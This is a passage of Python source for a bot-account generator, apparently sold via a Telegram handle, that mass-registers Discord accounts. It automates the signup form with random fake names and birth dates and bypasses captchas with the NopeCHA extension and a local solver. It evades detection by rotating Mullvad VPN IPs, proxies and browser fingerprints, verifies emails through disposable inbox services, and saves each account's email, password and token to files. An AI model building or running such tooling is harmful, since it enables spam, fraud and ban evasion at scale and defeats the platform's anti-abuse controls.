            output_file = OUTPUT_DIR / "invalid.txt"
        with LOCK:
            with open(output_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}:{token}\n")
        log.success(f"Saved to {output_file.name}")
    except Exception as e:
        log.error(f"Save failed: {e}")

def check_email_verified_api(token: str, proxy_config: Dict = None):
    try:
        session = tls_client.Session(client_identifier="chrome_138")
        if proxy_config:
            proxy_dict = get_session_proxy(proxy_config)
            if proxy_dict:
                session.proxies = proxy_dict
        headers = {'Authorization': token}
        response = session.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code == 200:
            return response.json().get('verified', False), response.json().get('email', 'N/A')
        return None, None
    except:
        return None, None

async def fill_date_of_birth(page):
    """Fill date of birth dropdowns - INSTANT"""
    
    months = ["January", "February", "March", "April", "May", "June",
              "July", "August", "September", "October", "November", "December"]
    day = str(random.randint(1, 28))
    month = random.choice(months)
    year = str(random.randint(1998,2004))
    
    try:
        result = await page.evaluate(f'''
        (async () => {{
            async function setDobField(label, value) {{
                const el = document.querySelector(`div[aria-label="${{label}}"]`);
                if (!el) return false;
                el.click();
                await new Promise(r => setTimeout(r, 100));
                
                // Type the value out so the combobox highlights it
                for (let i = 0; i < value.length; i++) {{
                    const char = value[i];
                    document.activeElement.dispatchEvent(new KeyboardEvent('keydown', {{
                        key: char,
                        code: isNaN(char) ? 'Key' + char.toUpperCase() : 'Digit' + char,
                        keyCode: char.toUpperCase().charCodeAt(0),
                        bubbles: true
                    }}));
                    await new Promise(r => setTimeout(r, 50));
                }}
                
                await new Promise(r => setTimeout(r, 100));
                
                // Press Enter to select
                document.activeElement.dispatchEvent(new KeyboardEvent('keydown', {{
                    key: 'Enter',
                    code: 'Enter',
                    keyCode: 13,
                    bubbles: true
                }}));
                
                await new Promise(r => setTimeout(r, 100));
                return true;
            }}

            const m = await setDobField("Month", "{month}");
            if (!m) return {{ success: false, error: "Month field not found" }};
            
            const d = await setDobField("Day", "{day}");
            if (!d) return {{ success: false, error: "Day field not found" }};
            
            const y = await setDobField("Year", "{year}");
            if (!y) return {{ success: false, error: "Year field not found" }};
            
            // Close any lingering dropdowns by clicking the body
            document.body.click();
            await new Promise(r => setTimeout(r, 150));
            
            // Aggressively find and click the Continue/Create button
            const buttons = document.querySelectorAll('button');
            for (const btn of buttons) {{
                const text = btn.textContent || '';
                if (text.includes('Continue') || text.includes('Create') || text.includes('Submit') || text.includes('Register')) {{
                    btn.click();
                    break;
                }}
            }}
            
            return {{ success: true }};
        }})()
        ''')

        if result and isinstance(result, dict) and result.get('success'):
            log.success(f"DOB: {month} {day}, {year}")
        else:
            log.debug(f"DOB failed: {result}")

    except Exception as e:
        log.debug(f"DOB error: {e}")


# ============================================================================
# REGISTRATION FORM FILLING
# ============================================================================

async def fill_registration_form(page, email: str, display_name: str, username: str, password: str) -> bool:
    try:
        # Filling form
        
        email_element = await page.wait_for('input[name="email"]', timeout=10000)
        await email_element.send_keys(email)
        await asyncio.sleep(0.1)
        
        display_element = await page.wait_for('input[name="global_name"]', timeout=5000)
        await display_element.send_keys(display_name)
        await asyncio.sleep(0.1)
        
        username_element = await page.wait_for('input[name="username"]', timeout=5000)
        await username_element.send_keys(username)
        await asyncio.sleep(0.1)
        
        # Try multiple selectors for password field
        password_element = None
        selectors = [
            'input[aria-label="Password"]',
            'input[name="password"]',
            'input[type="password"]'
        ]
        
        for selector in selectors:
            try:
                password_element = await page.query_selector(selector)
                if password_element:
                    break
            except:
                continue
        
        if password_element:
            await password_element.send_keys(password)
            await asyncio.sleep(0.2)
        else:
            pass
        
        await asyncio.sleep(0.2)
        await fill_date_of_birth(page)
        await asyncio.sleep(0.1)
        
        try:
            await page.evaluate(JS_UTILS)
            await asyncio.sleep(0.1)
            result = await page.evaluate('window.utils.clickAllCheckboxes()')
            if result and result.get('clicked', 0) > 0:
                log.success(f"✓ Clicked {result.get('clicked')} checkbox(es)")
        except Exception as e:
            pass
        
        clicked = False
        await asyncio.sleep(0.3)
        
        try:
            buttons = await page.query_selector_all('button')
            for button in buttons:
                try:
                    text = await button.get('textContent') or ""
                    if text and any(keyword in text for keyword in ['Continue', 'Create', 'Submit', 'Register']):
                        await button.click()
                        clicked = True
                        break
                except:
                    continue
        except:
            pass
        
        if not clicked:
            try:
                submit = await page.query_selector('[type="submit"]')
                if submit:
                    await submit.click()
                    clicked = True
            except:
                pass
        
        if not clicked:
            try:
                clicked = await page.evaluate('''() => {
                    const buttons = document.querySelectorAll('button');
                    for (const btn of buttons) {
                        const text = btn.textContent || '';
                        if (text.includes('Continue') || text.includes('Create') || text.includes('Submit')) {
                            btn.click();
                            return true;
                        }
                    }
                    return false;
                }''')
                if clicked:
                    log.success("Clicked submit via evaluate")
            except:
                pass
        
        if not clicked:
            log.error("Could not find submit button")
            return False
        
        log.success("✓ Form submitted!")
        return True
        
    except Exception as e:
        log.error(f"Form fill error: {e}")
        return False

async def wait_for_account_creation(page, timeout: int = 300) -> bool:
    start_time = time.time()
    last_url = ""

    while (time.time() - start_time) < timeout:
        await asyncio.sleep(0.5)

        try:
            try:
                current_url = await page.evaluate('window.location.href')
                if hasattr(current_url, 'value'):
                    current_url = current_url.value or ""
                elif isinstance(current_url, tuple):
                    current_url = str(current_url[0]) if current_url[0] else ""
                else:
                    current_url = str(current_url) if current_url else ""
            except Exception:
                current_url = ""

            if current_url and current_url != last_url:
                last_url = current_url

            if not current_url:
                continue

            skip = ['discord.com/register', 'discord.com/login', 'about:blank', 'chrome://']
            if 'discord.com' in current_url and not any(s in current_url for s in skip):
                return True

        except Exception as e:
            pass

    log.error("Timeout waiting for account creation")
    return False

async def wait_for_discord_token(page, timeout: int = 30, email: str = None, password: str = None, proxy_config: Dict = None):
    if not email or not password:
        log.error("Email and password required")
        return None
    
    await asyncio.sleep(3)
    
    attempts = 0
    max_attempts = 5
    
    while attempts < max_attempts:
        attempts += 1
        try:
            token = await fetch_discord_token(email, password, proxy_config)
            if token:
                return token
            else:
                pass
        except Exception as e:
            pass
        
        await asyncio.sleep(3)
    
    log.error("Could not fetch token")
    return None

async def worker(worker_id: int, proxy_config: Dict = None, fingerprint: str = None):
    global SESSION_CREATED, SESSION_STOP, ACTIVE_WORKERS

    if SESSION_STOP:
        if fingerprint:
            release_fingerprint(fingerprint)
        return

    with WORKER_LOCK:
        ACTIVE_WORKERS += 1

    browser = None
    temp_profile = None
    fingerprint_removed = False
    current_fingerprint = None

    try:
        if MULLVAD_AVAILABLE:
            country = config.get("mullvad", {}).get("country", "us")
            if not mullvad_rotate(country):
                log.error(f"Mullvad rotate failed, skipping")
                return

        first_names = ['Alex', 'Jordan', 'Taylor', 'Morgan', 'Casey', 'Riley', 'Sam', 'Blake', 'Drew', 'Avery', 'Jamie', 'Parker', 'Cameron', 'Dakota', 'Skyler', 'Quinn', 'Reese', 'Sage', 'River', 'Phoenix', 'Devon', 'Adrian', 'Bailey', 'Chase', 'Dakota', 'Ellis', 'Finley', 'Gray', 'Harper', 'Indigo', 'Jackie', 'Kennedy', 'Logan', 'Morgan', 'Noah', 'Ocean', 'Paris', 'Quinn', 'Robin', 'Sage', 'Taylor', 'Union', 'Vale', 'Wade', 'Xander', 'York', 'Zephyr', 'Aaron', 'Benjamin', 'Christopher', 'Daniel', 'Edward', 'Frank', 'George', 'Henry', 'Isaac', 'James', 'Kevin', 'Leonard', 'Michael', 'Nathan', 'Oliver', 'Patrick', 'Quinn', 'Robert', 'Steven', 'Thomas', 'Ulysses', 'Victor', 'William', 'Xavier', 'Yuki', 'Zachary', 'Alice', 'Bella', 'Charlotte', 'Diana', 'Elena', 'Fiona', 'Grace', 'Hannah', 'Iris', 'Jessica', 'Katherine', 'Laura', 'Michelle', 'Nancy', 'Olivia', 'Paige', 'Quinley', 'Rachel', 'Sophia', 'Tessa', 'Ursula', 'Victoria', 'Wendy', 'Ximena', 'Yasmine', 'Zoe']
        surnames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Wilson', 'Anderson', 'Taylor', 'Thomas', 'Moore', 'Jackson', 'Martin', 'Lee', 'Perez', 'Thompson', 'White', 'Harris', 'Sanchez', 'Clark', 'Ramirez', 'Lewis', 'Robinson', 'Walker', 'Young', 'Allen', 'King', 'Wright', 'Lopez', 'Hill', 'Scott', 'Green', 'Adams', 'Nelson', 'Carter', 'Roberts', 'Edwards', 'Collins', 'Reeves', 'Morris', 'Murphy', 'Rogers', 'Morgan', 'Peterson', 'Cooper', 'Reed', 'Bell', 'Gomez', 'Murray', 'Freeman', 'Wells', 'Webb', 'Simpson', 'Stevens', 'Tucker', 'Porter', 'Hunter', 'Hicks', 'Crawford', 'Henry', 'Boyd', 'Mason', 'Moreno', 'Kennedy', 'Warren', 'Dixon', 'Ramos', 'Reeves', 'Burns', 'Gordon', 'Shaw', 'Holmes', 'Rice', 'Robertson', 'Hunt', 'Black', 'Daniels', 'Palmer', 'Mills', 'Nicholson', 'Grant', 'Knight', 'Ferguson', 'Stone', 'Hawkins', 'Dunn', 'Perkins', 'Hudson', 'Spencer', 'Gardner', 'Stephens', 'Payne', 'Pierce', 'Berry', 'Matthews', 'Arnold', 'Wagner', 'Willis', 'Ray', 'Watkins', 'Olson', 'Carroll', 'Duncan', 'Snyder', 'Hart', 'Cunningham', 'Knight', 'Chase', 'Wyatt']
        
        first_name = random.choice(first_names).lower()
        last_name = random.choice(surnames).lower()
        display_name = first_name.capitalize() + ' ' + last_name.capitalize()
        
        username_suffixes = ['goturback', 'alltake', 'isdone', 'nowake', 'makeit', 'bestme', 'allset', 'isgood', 'letgo', 'final']
        discord_username = f"{first_name}{random.choice(username_suffixes)}{random.randint(100, 999)}"
        
        email, email_password, email_token, email_uuid, email_provider = get_email_from_provider(config)
        if not email:
            log.error(f"Failed to get email")
            return
        
        account_password = email_password or generate_form_password(10)
        log.success(f"Email: {log.mask_email(email)}")
        
        temp_profile = tempfile.mkdtemp()
        browser_args = [
            f'--user-data-dir={temp_profile}',
            '--disable-backgrounding-occluded-windows',
            '--disable-background-timer-throttling',
            '--disable-renderer-backgrounding',
            '--disable-throttling',
            '--no-first-run',
            '--disable-default-apps',
            '--disable-features=IsolateOrigins,site-per-process,ChromeWhatsNewUI',
            '--disable-dev-shm-usage',
            '--disable-breakpad',
            '--disable-component-extensions-with-background-pages',
            '--disable-features=TranslateUI,MediaRouter,OptimizationHints',
            '--disable-domain-reliability',
            '--window-size=960,1070',
            '--window-position=0,0',
            '--force-device-scale-factor=1',
        ]
        
        if proxy_config and not MULLVAD_AVAILABLE:
            browser_args.extend(get_browser_proxy_args(proxy_config))

        if NOPECHA_EXT_DIR.exists():
            browser_args.append(f'--load-extension={NOPECHA_EXT_DIR}')
        
        current_key = get_current_nopecha_key()
        injected_key = False
        if current_key:
            injected_key = inject_nopecha_key(current_key)
        
        current_fingerprint = fingerprint
        if current_fingerprint:
            fingerprint_text = f"Fingerprint: {log.mask_fingerprint(current_fingerprint)}"
            if injected_key:
                log.info(f"NopeCHA key injected | {fingerprint_text}")
            else:
                log.info(fingerprint_text)
        elif injected_key:
            log.info("NopeCHA key injected")
        
        browser = await uc.start(
            headless=False,
            browser_executable_path=BRAVE_PATH if BRAVE_PATH else None,
            browser_args=browser_args,
        )
        
        page = await browser.get("https://discord.com/register")
        if not page:
            log.error(f"Could not get page")
            return
        
        for _ in range(30):
            try:
                if await page.query_selector('input[name="email"]'):
                    break
            except:
                pass
            await asyncio.sleep(0.3)

        await asyncio.sleep(0.3)

        success = await fill_registration_form(page, email, display_name, discord_username, account_password)
        if not success:
            log.error(f"Form fill failed")
            return
        
        created = await wait_for_account_creation(page)
        
        if created:
            log.solved(f"Account created!")
        else:
            log.error(f"Creation failed")
            return
        
        token = await wait_for_discord_token(page, email=email, password=account_password, proxy_config=proxy_config)
        
        if token:
            if token.startswith('"') and token.endswith('"'):
                token = token[1:-1]

            token_match = re.search(r'([a-zA-Z0-9_-]{20,})\.([a-zA-Z0-9_-]{6})\.([a-zA-Z0-9_-]{27,})', token)
            if token_match:
                token = f"{token_match.group(1)}.{token_match.group(2)}.{token_match.group(3)}"
            
            log.success(f"✓ Token fetched! Token: {log.mask_token(token)}")
            
            if email_provider in ["hotmail007", "zeusx"]:
                verified = await verify_email_hotmail007(
                    email, email_token, email_uuid, browser, token, proxy_config
                )
                if verified:
                    log.success(f"Email verified!")
                else:
                    log.warning(f"Email verification failed")
            elif email_provider == "leveragers":
                api_key = config.get("email_provider", {}).get("api_key", "").strip()
                verified = await verify_email_leveragers(
                    email, email_password, browser, token, api_key
                )
                if verified:
                    log.success(f"Email verified!")
                else:
                    pass
            elif email_provider == "venumzmail":
                v_config = config.get("email_providers", {}).get("venumzmail", {})
                api_key = v_config.get("api_key", "").strip()
                api_base = v_config.get("api_base", "https://api.venumzmail.xyz")
                domain = email.split('@')[1] if '@' in email else "lickingpussy.online"
                verified = await verify_email_venumzmail(
                    email, api_key, browser, token, domain, api_base, timeout=60
                )
                if verified:
                    log.success(f"Email verified!")
                else:
                    log.warning(f"Email verification failed")
                    unverified_file = OUTPUT_DIR / "unverified.txt"
                    with LOCK:
                        with open(unverified_file, 'a', encoding='utf-8') as f:
                            f.write(f"{email}:{account_password}:{token}\n")
                    log.info(f"Saved unverified account to unverified.txt")
            elif email_provider == "mailcow":
                verified = await verify_email_mailcow(
                    email, email_password, browser, token, config
                )
                if verified:
                    log.success(f"Email verified!")
                else:
                    pass
            elif email_provider == "public temp inbox":
                api_key = config.get("email_provider", {}).get("api_key", "").strip()
                domain = config.get("email_provider", {}).get("domain", "durudraxon.online")
                api_base = config.get("email_provider", {}).get("api_base", "https://mail.draxono.in")
                verified = await verify_email_public_temp_inbox(
                    email, email_password, browser, token, api_key, domain, api_base
                )
                if verified:
                    log.success(f"Email verified!")
                else:
                    pass
            
            result = check_token(token, proxy_config)
            log.token_status(result)
            save_account_to_file(email, account_password, token, result)
            
            if current_fingerprint:
                consume_fingerprint(current_fingerprint)
                fingerprint_removed = True
                log.info(f"Consumed fingerprint for token: {log.mask_fingerprint(current_fingerprint)}")

            with LOCK:
                SESSION_CREATED += 1
                created_now = SESSION_CREATED

            log.success(f"Account #{created_now} created")
            
            if SESSION_TARGET > 0 and created_now >= SESSION_TARGET:
                with LOCK:
                    SESSION_STOP = True
        else:
            pass
            
    except Exception as e:
        log.error(f"Error: {e}")
    
    finally:
        if not fingerprint_removed and current_fingerprint:
            release_fingerprint(current_fingerprint)
        if browser:
            try:
                await browser.stop()
            except:
                pass
        if temp_profile and os.path.exists(temp_profile):
            try:
                shutil.rmtree(temp_profile, ignore_errors=True)
            except:
                pass
        with WORKER_LOCK:
            ACTIVE_WORKERS -= 1

async def batch_cooldown(batch_size: int, accounts_created: int):
    if accounts_created == 0:
        return
    for remaining in range(COOLDOWN_SECONDS, 0, -1):
        mins, secs = divmod(remaining, 60)
        print(f"\r{YELLOW}[BATCH] ➜ {RESET}Next batch in: {CYAN}{mins:02d}:{secs:02d}{RESET} ", end='', flush=True)
        await asyncio.sleep(1)
    print()

async def run_workers():
    global SESSION_TARGET, SESSION_CREATED, SESSION_STOP, PROXY_LIST
    
    all_proxies = load_proxies(config)
    with PROXY_LIST_LOCK:
        PROXY_LIST = all_proxies if all_proxies else []
    
    while not SESSION_STOP:
        with LOCK:
            if SESSION_TARGET > 0 and SESSION_CREATED >= SESSION_TARGET:
                SESSION_STOP = True
                break
        
        accounts_before = SESSION_CREATED
        remaining = SESSION_TARGET - SESSION_CREATED if SESSION_TARGET > 0 else THREAD_COUNT
        batch_size = min(THREAD_COUNT, remaining) if SESSION_TARGET > 0 else THREAD_COUNT
        
        if batch_size <= 0 and SESSION_TARGET > 0:
            break
        
        tasks = []
        for i in range(batch_size):
            worker_id = random.randint(10000, 99999)
            current_proxy = get_random_proxy()
            rotate_nopecha_key()
            fingerprint = reserve_fingerprint()
            tasks.append(asyncio.create_task(worker(worker_id, current_proxy, fingerprint)))
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        
        accounts_created = SESSION_CREATED - accounts_before
        
        if SESSION_TARGET > 0:
            if SESSION_CREATED < SESSION_TARGET:
                await batch_cooldown(batch_size, accounts_created)
        else:
            await batch_cooldown(batch_size, accounts_created)
        
        await asyncio.sleep(0.1)
    
    log.success(f"Completed! Created {SESSION_CREATED} account(s)")

def show_tampon_banner(ip: str = None, threads: int = None):
    info_line = "tg : @kodrasells"
    if ip:
        info_line += f" | IP : {log.mask_ip(ip)}"
    if threads:
        info_line += f" | Threads : {threads}"
    
    banner = f"""{RED}
▄▄▄█████▓ ▄▄▄       ███▄ ▄███▓ ██▓███   ▒█████   ███▄    █ 
▓  ██▒ ▓▒▒████▄    ▓██▒▀█▀ ██▒▓██░  ██▒▒██▒  ██▒ ██ ▀█   █ 
▒ ▓██░ ▒░▒██  ▀█▄  ▓██    ▓██░▓██░ ██▓▒▒██░  ██▒▓██  ▀█ ██▒
░ ▓██▓ ░ ░██▄▄▄▄██ ▒██    ▒██ ▒██▄█▓▒ ▒▒██   ██░▓██▒  ▐▌██▒
  ▒██▒ ░  ▓█   ▓██▒▒██▒   ░██▒▒██▒ ░  ░░ ████▓▒░▒██░   ▓██░
  ▒ ░░    ▒▒   ▓▒█░░ ▒░   ░  ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
    ░      ▒   ▒▒ ░░  ░      ░░▒ ░       ░ ▒ ▒░ ░ ░░   ░ ▒░
  ░        ░   ▒   ░      ░   ░░       ░ ░ ░ ▒     ░   ░ ░ 
               ░  ░       ░                ░ ░           ░ 
               {info_line}
{RESET}"""
    print(banner)

async def main():
    global SESSION_TARGET
    
    current_ip = None
    if MULLVAD_AVAILABLE:
        current_ip = mullvad_get_ip()
    
    show_tampon_banner(ip=current_ip, threads=THREAD_COUNT)
    
    show_balance_and_stock()
    
    if not check_solver_health():
        log.warning("Local Solver not detected!")
        log.info("Start solver: python solver_v2.py")
        use_solver = input(f"{WHITE}Continue without solver? [y/n]: {RESET}").strip().lower() == 'y'
        if not use_solver:
            return
    else:
        log.success("Captcha Solver connected")
    
    provider = config.get("email_provider", {}).get("name", "")

    if MULLVAD_AVAILABLE:
        ip = mullvad_get_ip()
    else:
        pass
    
    while True:
        try:
            count = input(f"{WHITE}Accounts to create (0=infinite): {RESET}").strip()
            if count.isdigit():
                SESSION_TARGET = int(count)
                break
        except:
            pass
    
    print()
    if SESSION_TARGET == 0:
        pass
    else:
        pass
    print()
    
    download_nopecha_ext()
    
    all_proxies = load_proxies(config)
    if all_proxies:
        pass
    else:
        pass
    
    try:
        await run_workers()
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Stopped{RESET}")
    except Exception as e:
        log.error(f"Error: {e}")